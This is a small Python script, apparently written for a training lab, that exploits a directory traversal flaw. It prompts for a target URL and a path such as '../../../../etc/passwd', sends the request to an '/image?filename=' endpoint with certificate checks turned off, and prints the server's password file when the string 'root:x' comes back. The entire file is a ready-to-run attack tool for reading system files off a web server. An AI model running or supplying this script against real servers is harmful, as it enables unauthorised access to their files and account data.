import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def directory_traversal_exploit():
    """Exploit directory traversal by prompting user for URL and file path."""
    # Prompt user for the base URL
    url = input("(+) Enter the target URL (e.g., https://www.example.com): ").strip()
    if not url:
        print("[-] No URL provided. Exiting.")
        sys.exit(-1)

    # Prompt user for the file path (e.g., ../../../../etc/passwd)
    filename = input("(+) Enter the file path to traverse (e.g., ../../../../etc/passwd): ").strip()
    if not filename:
        print("[-] No file path provided. Exiting.")
        sys.exit(-1)

    # Construct the full image URL with hardcoded endpoint
    image_url = url + '/image?filename=' + filename
    try:
        r = requests.get(image_url, verify=False, timeout=5)
        if 'root:x' in r.text:
            print('(+) Exploit successful!')
            print('(+) The following is the content of the /etc/passwd file:')
            print(r.text)
        else:
            print('(-) Exploit failed.')
            sys.exit(-1)
    except requests.exceptions.RequestException as e:
        print(f"[-] Error occurred: {e}")
        sys.exit(-1)

def main():
    print("(+) Exploiting the directory traversal vulnerability...")
    directory_traversal_exploit()

if __name__ == "__main__":
    main()